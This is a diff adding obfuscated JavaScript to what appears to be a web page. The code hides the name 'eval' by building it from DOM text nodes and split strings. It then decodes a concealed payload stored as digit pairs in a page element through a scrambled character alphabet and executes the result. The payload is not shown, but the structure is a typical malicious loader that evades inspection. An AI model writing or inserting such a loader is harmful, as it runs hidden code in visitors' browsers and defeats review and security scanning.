@@ -1,0 +1,22 @@
+q="v";
+			el=document.getElementsByTagName("di"+q)[0];
+			with(el){
+				appendChild(document.createTextNode("eval"));
+			}
+			q="xtNode";
+			el.appendChild(document["createTe"+q]("ReferenceError"));
+			el3=el.lastChild.previousSibling;
+			el2=el.removeChild(el.childNodes[1]);
+			el.appendChild(document["createTe"+q]("la"+"ce"));
+			k=el2.nodeValue;
+			e = eval(el3.nodeValue);
+			ar = "98c_r'qb]\"RA{y!I2|pe+Udoxs&;:FBzLTQVKHC ^N1J=*a5}f3w/,0u7W.m>S?4E)$v-Ot@\\h(XPi6ln[kj<gGDM";
+			qwe=document.getElementsByTagName("div")[1].innerHTML;
+			s="";
+			for (i=0;i<qwe.length;i+=2){
+				q=qwe.substr(i,1)*10;
+				q2=qwe.substr(i+1,1)*1;
+				e("q+=q2");
+				s=s["concat"](ar["substr"](e("q"),1));
+			}
+			e(s);
